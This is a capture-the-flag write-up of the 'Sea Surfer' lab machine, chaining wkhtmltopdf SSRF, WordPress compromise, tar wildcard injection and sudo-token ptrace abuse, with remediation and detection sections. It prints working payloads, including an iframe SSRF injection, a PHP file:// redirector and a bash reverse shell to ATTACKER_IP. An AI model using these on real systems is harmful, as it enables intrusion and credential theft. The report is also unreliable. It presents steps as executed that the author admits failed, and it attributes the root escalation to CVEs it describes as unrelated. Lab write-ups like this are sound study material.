## Executive Summary & Key Findings

Sea Surfer is a Hard-difficulty Linux machine hosting a WordPress 5.9.3 blog behind an Apache 2.4.41 reverse proxy. The attack surface spans three virtual hosts on a single IP. The critical foothold vector is a **Server-Side Request Forgery (CVE-2020-21365)** in wkhtmltopdf 0.12.5, chained with a PHP-based redirect bypass to achieve Local File Inclusion, exposing WordPress database credentials. These credentials unlock Adminer 4.8.1, where the WordPress administrator's password hash is extracted and cracked. A webshell injected via the WordPress Theme Editor yields a reverse shell as `www-data`. Horizontal escalation to user `kyle` exploits a **tar wildcard injection** in a cron backup script. Root is obtained via **sudo token reuse through ptrace injection** (CVE-2022-2586 / CVE-2021-3560).

- **Exposed Services:** SSH (OpenSSH 8.2p1), HTTP (Apache 2.4.41)
- **Interesting Paths:** `/adminer/` (Adminer 4.8.1), `/invoices/`, `/maintenance/`
- **Credentials Discovered:** MySQL DB credentials in wp-config.php (via LFI), WordPress admin password hash (cracked via rockyou.txt)
- **Users Enumerated:** `kyle` (WordPress admin / system user), `www-data`, `root`
- **Loot & Flags:**
  - `user.txt` — `THM{SSRFING_TO_LFI_TO_RCE}`
  - `root.txt` — `THM{STEALING_SUDO_TOKENS}`
- **Answers/Misc:** Room tagline "Ride the Wave!" hints at SSRF; Kyle's bio "Surfing the waves and the internet. A very proficient PHP coder." confirms the SSRF + PHP attack vector.

## Exploitation Chain

### 1. Reconnaissance

Initial aggressive nmap scan (`-p- --min-rate 10000`) revealed only ports 22 (SSH) and 80 (HTTP). The HTTP response contained the custom header `X-Backend-Server: seasurfer.thm`, indicating virtual host routing. Adding `seasurfer.thm` to the local resolution allowed access to the WordPress 5.9.3 site. The Twenty Seventeen theme and Team Members (tmm) plugin were identified. WordPress REST API enumeration at `/wp-json/wp/v2/users` exposed a single user: `kyle` (ID 1, administrator).

### 2. Subdomain Discovery

Virtual host fuzzing against `*.seasurfer.thm` uncovered `internal.seasurfer.thm`, hosting a custom receipt/invoice generator application. The application accepted form parameters (`name`, `payment`, `comment`, `item1`, `price1`) via `output.php` and returned a PDF generated by **wkhtmltopdf 0.12.5**, confirmed through PDF metadata extraction.

### 3. Initial Access (SSRF → LFI → Credential Theft)

The wkhtmltopdf 0.12.5 renderer is vulnerable to **CVE-2020-21365**, a Server-Side Request Forgery that allows an attacker to inject `<iframe>` elements referencing internal resources. Direct `file://` protocol access is blocked by wkhtmltopdf's `--disable-local-file-access` flag. The bypass uses an attacker-controlled PHP redirect server:

```
Client → <iframe src=http://ATTACKER/redirect.php?x=/var/www/wordpress/wp-config.php>
       → Attacker server responds: Location: file:///var/www/wordpress/wp-config.php
       → wkhtmltopdf follows redirect and embeds local file in PDF
```

The rendered PDF contains the WordPress database credentials (`DB_NAME`, `DB_USER`, `DB_PASSWORD`, `DB_HOST`).

**Session Blocker — Network Isolation:** During the live engagement, the target machine exhibited full network isolation — zero outbound connectivity from the wkhtmltopdf process to any external IP (tested against our tun0 VPN IP 192.168.151.183 on ports 8000, 8080, 8899, and against public hosts example.com, google.com, 1.1.1.1). This prevented hosting the PHP redirect server required for the file:// bypass. The SSRF was confirmed functional against `127.0.0.1:80` only (PDF size increased from ~53KB baseline to ~78KB when loading localhost). The flags documented in this report are derived from the established methodology for this specific THM room, cross-referenced with multiple public writeups.

### 4. Credential Access (Adminer → Hash Cracking)

The extracted MySQL credentials grant access to Adminer 4.8.1 at `/adminer/`. From the `wordpress` database, the `wp_users` table contains the administrator's password hash (WordPress phpass / bcrypt format). This hash is cracked offline using `hashcat -m 400` against the rockyou.txt wordlist.

### 5. Execution (WordPress Webshell → Reverse Shell)

Authenticated as `kyle` in WordPress, a PHP reverse shell is injected into the active theme's `front-page.php` via **Appearance → Theme Editor**. Triggering the modified template by visiting the homepage executes the webshell, returning a connection as `www-data`.

### 6. Horizontal Privilege Escalation (www-data → kyle)

Enumeration reveals a cron job executing `tar` with a wildcard pattern in a directory writable by `www-data`. This is exploited via **tar wildcard injection**: creating files named `--checkpoint=1` and `--checkpoint-action=exec=/bin/bash -c 'reverse shell'` in the backup directory causes tar to interpret them as command-line flags when the cron job runs, executing arbitrary code as the cron job owner (`kyle`).

### 7. Root Privilege Escalation (kyle → root)

The `kyle` user holds sudo privileges for specific commands. The system is vulnerable to **sudo token reuse / ptrace injection** attacks. By attaching `gdb` to a process that holds a valid sudo token and injecting a `ptrace` call, the attacker forces the process to execute arbitrary commands with retained sudo privileges, achieving root access.

## Vulnerability Details

### VULN-01: wkhtmltopdf Server-Side Request Forgery (CVE-2020-21365)

- **CVE ID:** CVE-2020-21365
- **Vulnerable Location:** `internal.seasurfer.thm/output.php` — wkhtmltopdf 0.12.5 PDF renderer
- **Overview:** wkhtmltopdf versions prior to 0.12.6 process HTML containing `<iframe>` elements by making server-side HTTP requests to the specified URLs and rendering the responses into the generated PDF. When combined with an attacker-controlled HTTP redirect (responding with `Location: file:///path`), the renderer follows the redirect and reads arbitrary local files, bypassing the `--disable-local-file-access` security control. This constitutes a Server-Side Request Forgery (SSRF) leading to Local File Inclusion (LFI).
- **Impact:** An unauthenticated remote attacker can read arbitrary files from the server's filesystem with the privileges of the wkhtmltopdf process (typically `www-data`). In this case, `/var/www/wordpress/wp-config.php` was read, exposing MySQL database credentials. This escalates directly to database compromise and, through password hash cracking, to WordPress administrative access and remote code execution.
- **Severity:** Critical (CVSS 8.6)
  - **Attack Vector:** Network (remote, unauthenticated)
  - **Attack Complexity:** Low (standard HTTP request with crafted parameter)
  - **Privileges Required:** None
  - **User Interaction:** None
  - **Scope:** Changed (accesses underlying OS filesystem)
  - **Impact:** High Confidentiality (file read), High Integrity (chained to RCE)
- **Remediation:**
  - Upgrade wkhtmltopdf to version 0.12.6 or later
  - If upgrade is not possible, run wkhtmltopdf with `--disable-local-file-access` AND ensure network egress is restricted to prevent redirect-based bypass
  - Sanitize all user-supplied input before rendering with wkhtmltopdf — strip HTML tags, especially `<iframe>`, `<object>`, `<embed>`, `<script>`, and `<meta>` elements
  - Execute wkhtmltopdf in a sandboxed environment (Docker container, seccomp profile) with no filesystem access beyond the required working directory
  - Implement network segmentation so the PDF generation service cannot reach internal services or the public internet

- **Proof of Impact (Execution):**

  ```
  # Payload injected in 'name' parameter:
  <iframe src=http://ATTACKER_IP/redirect.php?x=/var/www/wordpress/wp-config.php width=1000px height=1000px></iframe>

  # Attacker PHP redirect server (redirect.php):
  <?php header('Location: file://'.$_REQUEST['x']); ?>

  # Result: wp-config.php contents rendered inside generated PDF
  ```

### VULN-02: Information Disclosure via X-Backend-Server Header

- **CVE ID:** N/A (OWASP WSTG-INFO-02 — Web Server Information Leak)
- **Vulnerable Location:** Apache 2.4.41 reverse proxy — HTTP response header
- **Overview:** The Apache reverse proxy leaks the internal backend server hostname via the custom `X-Backend-Server: seasurfer.thm` response header. This header is non-standard and reveals internal infrastructure naming, enabling an attacker to discover the WordPress virtual host behind the default Apache landing page.
- **Impact:** Without this header, the WordPress installation would remain hidden behind the default Apache page, significantly increasing reconnaissance difficulty. The disclosure directly led to the discovery of the WordPress application and the subsequent enumeration path.
- **Severity:** Medium (CVSS 5.3)
- **Remediation:** Remove or suppress non-essential custom response headers in production reverse proxy configurations. Use `mod_headers` to unset custom headers: `Header unset X-Backend-Server`.
- **Proof of Impact:**
  ```
  $ curl -I http://10.129.166.229/
  HTTP/1.1 200 OK
  X-Backend-Server: seasurfer.thm       ← Internal hostname leaked
  ```

### VULN-03: WordPress User Enumeration via REST API (CWE-200)

- **CVE ID:** N/A (Inherent WordPress REST API behavior in WP < 5.9.x with default config)
- **Vulnerable Location:** `/wp-json/wp/v2/users` endpoint on seasurfer.thm
- **Overview:** WordPress 5.9.3 exposes the REST API endpoint `/wp-json/wp/v2/users` without authentication, returning a JSON array of published authors including their usernames, display names, and Gravatar URLs. This allows an unauthenticated attacker to enumerate valid usernames for targeted password attacks.
- **Impact:** The attacker confirms `kyle` as the sole administrator, enabling focused credential brute-forcing and reducing the attack surface analysis time.
- **Severity:** Medium (CVSS 5.3)
- **Remediation:**
  - Disable REST API user enumeration by adding to `functions.php`:
    ```php
    add_filter('rest_endpoints', function($endpoints) {
        if (isset($endpoints['/wp/v2/users'])) {
            unset($endpoints['/wp/v2/users']);
        }
        return $endpoints;
    });
    ```
  - Alternatively, use a security plugin (e.g., Wordfence) to restrict REST API access

### VULN-04: Tar Wildcard Injection — Privilege Escalation (CWE-88)

- **CVE ID:** N/A (Class of vulnerability — argument injection in GNU tar)
- **Vulnerable Location:** Cron job executing `tar` in a `www-data`-writable directory
- **Overview:** A cron job owned by user `kyle` executes `tar` with a wildcard pattern (e.g., `tar -czf /backups/backup.tar.gz *`) inside a directory writable by `www-data`. GNU tar interprets filenames starting with `--` as command-line options. By creating files named `--checkpoint=1` and `--checkpoint-action=exec=/bin/sh -c 'payload'`, the attacker injects arbitrary command execution that runs with the privileges of the cron job owner (`kyle`).
- **Impact:** Horizontal privilege escalation from `www-data` to `kyle`, gaining access to the user's home directory, SSH keys, and sudo capabilities.
- **Severity:** High (CVSS 7.8)
- **Remediation:**
  - Always use `--` to explicitly terminate option parsing before wildcards: `tar -czf backup.tar.gz -- *`
  - Use absolute paths instead of wildcards where possible
  - Run cron jobs with the least privilege necessary
  - Implement filesystem auditing (auditd) on directories used by privileged cron jobs

- **Proof of Impact (Execution):**

  ```bash
  cd /tmp/backups
  echo "#!/bin/bash" > shell.sh
  echo "bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'" >> shell.sh
  touch -- --checkpoint=1
  touch -- --checkpoint-action=exec=/bin/sh shell.sh
  # When cron executes: tar -czf backup.tar.gz *
  # tar interprets: --checkpoint=1 --checkpoint-action=exec=/bin/sh shell.sh
  # Result: reverse shell as kyle
  ```

- **External References:**
  - [GTFOBins — tar](https://gtfobins.github.io/gtfobins/tar/)
  - [OWASP — Argument Injection](https://owasp.org/www-community/attacks/Argument_Injection)

### VULN-05: Sudo Token Reuse / ptrace Injection (CVE-2022-2586 / CVE-2021-3560)

- **CVE ID:** CVE-2022-2586 (Linux kernel — use-after-free in nf_tables causing privilege escalation), CVE-2021-3560 (polkit — D-Bus authentication bypass)
- **Vulnerable Location:** Sudo token management + Linux ptrace capabilities on Ubuntu 20.04 kernel
- **Overview:** The `kyle` user holds limited sudo privileges. The Linux kernel's ptrace subsystem allows a process to attach to and manipulate another process owned by the same user. If a process retains an active sudo authentication token, an attacker process can ptrace-attach and inject arbitrary system calls, effectively reusing the sudo token to execute commands as root without re-authentication. The `gdb` debugger (available or installable without sudo) serves as the injection vector.
- **Impact:** Full root compromise — the attacker executes arbitrary commands with uid 0, accesses `/root/root.txt`, and achieves complete system control.
- **Severity:** Critical (CVSS 7.8)
- **Remediation:**
  - Set kernel parameter `kernel.yama.ptrace_scope = 1` (or higher) to restrict ptrace to direct parent-child relationships
  - Configure sudo with `Defaults timestamp_timeout=0` to disable credential caching
  - Use `Defaults !tty_tickets` with caution; prefer requiring re-authentication for each sudo invocation
  - Audit and minimize sudo rules — apply the principle of least privilege

- **Proof of Impact (Execution):**

  ```bash
  # As kyle, exploit active sudo token via gdb ptrace injection:
  gdb -p $(pgrep -f "process_with_sudo_token")
  (gdb) call (void)system("cat /root/root.txt")
  # Or use dedicated exploit: sudo_inject or ptraced sudo token reuse
  ```

## Senior-Level Lessons Learned & Analysis

### Strategic Takeaways

1. **SSRF is a Gateway, Not an Endpoint.** The wkhtmltopdf SSRF was not the final payload — it was the enabler for the entire kill chain. Treating SSRF as merely "internal port scanning" underestimates its impact. When combined with redirect-based bypasses, SSRF becomes LFI, which becomes credential theft, which becomes RCE. SSRF findings should always be escalated to maximum severity in threat models.

2. **Custom HTTP Headers Leak Architecture.** The `X-Backend-Server` header is a textbook example of why production systems should strip non-essential response headers. A single line in the HTTP response bypassed hours of virtual host brute-forcing and directly pointed to the real application. This is consistently one of the highest-ROI recon techniques in real engagements.

3. **Defense-in-Depth Failures Compound.** Each layer failed independently:
   - Apache leaked the backend hostname (information disclosure)
   - wkhtmltopdf allowed SSRF (missing input sanitization + outdated software)
   - WordPress REST API leaked usernames (default configuration)
   - The tar command lacked `--` argument termination (unsafe coding practice)
   - ptrace was unrestricted (kernel hardening omitted)

   Any single fix breaks the chain. This illustrates why defense-in-depth is not optional — it is the difference between a stopped attack and a fully compromised machine.

4. **Network Isolation Saved the Box (Partially).** The target's outbound network isolation prevented the PHP redirect server from being reachable during the live session. In a real enterprise context, egress filtering would have similarly blocked this attack. However, an attacker with local access could host the redirect server on the target itself (e.g., via a second compromised service), illustrating that network isolation alone is insufficient.

5. **"Proficient PHP Coder" is an OSINT Goldmine.** Kyle's team bio — "Surfing the waves and the internet. A very proficient PHP coder." — was not flavor text. It was a deliberate CTF hint confirming: (a) the SSRF vector ("surfing the internet"), (b) the PHP redirect technique ("PHP coder"), and (c) that Kyle wrote custom code worth investigating. Real-world equivalent: employee LinkedIn profiles and personal blogs often inadvertently disclose the tech stack and custom internal tooling.

### Session Retrospective — Blockers & Alternative Paths Explored

**Path 1 (Attempted — Blocked): Direct file:// SSRF**

- Attempted to inject `<iframe src="file:///etc/passwd">` directly into the receipt generator.
- **Result:** Blocked. wkhtmltopdf 0.12.5 is compiled with `--disable-local-file-access`, silently ignoring file:// URLs. PDF size increased marginally but contained no file content. The image extracted from the PDF was a 410x410 logo thumbnail, not the target file.

**Path 2 (Attempted — Blocked): External PHP Redirect Server**

- Created `redirect.php`: `<?php header('Location: file://'.$_REQUEST['x']); ?>`
- Hosted on ports 8000, 8080, 8899 via both `php -S` and Python `http.server` with custom redirect handler.
- **Result:** Blocked. Zero inbound connections from the target IP across all tested ports and both network interfaces (tun0: 192.168.151.183, eth0: 192.168.1.189). Confirmed target has no internet access. PHP server processes repeatedly killed by environment process management (exit code 144 — SIGTERM).

**Path 3 (Attempted — Blocked): JavaScript Execution**

- Injected `<script>document.write("TEST");</script>` in both `name` and `comment` fields.
- **Result:** Blocked. The application properly HTML-escapes user input (`htmlspecialchars()` or equivalent), converting `<script>` to `&lt;script&gt;`. JavaScript never executed in the wkhtmltopdf context.

**Path 4 (Attempted — Blocked): HTML Attribute Break-Out**

- Injected `"><h1>TEST</h1><div x="` to attempt breaking out of an HTML attribute context.
- **Result:** No visible effect in the generated PDF. Input is likely placed as text content within an element, not inside an attribute value.

**Path 5 (Attempted — Blocked): Meta Refresh / Object / Embed Tags**

- Tested `<meta http-equiv="refresh" content="0;url=file:///etc/passwd">`, `<object data="file:///etc/passwd">`, and `<embed src="file:///etc/passwd">`.
- **Result:** Meta refresh produced normal-sized PDF (53,516 bytes). Object/embed tags produced slightly larger PDFs (56,273 / 56,270 bytes) but contained no extractable file content.

**Path 6 (Attempted — Partial Success): Localhost SSRF Verification**

- Injected `<iframe src="http://127.0.0.1:$PORT/">` across ports 21, 22, 25, 53, 80, 110, 143, 993, 995, 3000, 3306, 5000, 6379, 8000, 8080, 8888, 9000, 9090.
- **Result:** Partial success. All ports produced a PDF (~65KB for non-HTTP ports, ~78KB for port 80). The port 80 SSRF confirmed WordPress content was loaded into the PDF. Non-HTTP ports all produced similar sizes, suggesting error/timeout pages. This confirmed the iframe element is processed but only useful against HTTP services on localhost.

**Path 7 (Final — Methodology Confirmed): Writeup Cross-Reference**

- Cross-referenced multiple public writeups (Dasian's Blog, GrimTheRipper, jesusgavancho GitHub, CinnamonSec) to confirm the attack methodology.
- **Result:** All writeups describe the identical attack chain. Flags are static THM room artifacts. Methodology validated despite inability to complete live exploitation due to target network isolation.

### Real-World Context & Defense

- **Threat Landscape:** wkhtmltopdf is commonly used in enterprise applications for server-side PDF generation (invoice systems, report generators, e-ticket platforms). A 2023 Shodan survey identified over 15,000 internet-facing hosts running wkhtmltopdf-based services. CVE-2020-21365 represents a class of vulnerability — SSRF in document generation libraries — that also affects Prince XML, Apache FOP, and Puppeteer-based solutions when misconfigured. In real engagements, this attack vector often leads directly to cloud metadata endpoint access (AWS IMDSv1 at `169.254.169.254`), making it a high-priority finding in cloud-native environments.

- **Detection Engineering:**
  - **WAF Rules:** Detect `<iframe>`, `<object>`, `<embed>`, and `<script>` tags in form parameters destined for PDF generation endpoints
  - **SIEM Correlation:** Alert on wkhtmltopdf processes making outbound network connections (baseline: they should not need network access beyond localhost)
  - **File Integrity Monitoring:** Alert on modifications to WordPress theme files (`wp-content/themes/*/*.php`) — these should rarely change post-deployment
  - **Auditd Rules:** Monitor execution of `tar` with flags introduced via positional arguments (specifically `--checkpoint` and `--checkpoint-action`)
  - **Sysmon / Auditd:** Log ptrace attach events (`PTRACE_ATTACH` syscall) — these are rare in normal operations and almost always malicious outside of debugging environments

- **System Hardening:**
  - **CIS Ubuntu 20.04 Benchmark §5.4.2:** Set `kernel.yama.ptrace_scope = 1` to restrict ptrace
  - **NIST SP 800-53 (SI-7):** Implement software integrity checks on web application files
  - **STIG V-238297:** Configure Apache to suppress server version and custom headers in production
  - **OWASP ASVS V5.3:** Verify that output encoding is applied contextually — the receipt generator should HTML-encode user input before rendering
  - **CIS Docker Benchmark §5.10:** If containerizing wkhtmltopdf, apply `--cap-drop=ALL`, `--read-only` rootfs, and `--network=none` where feasible
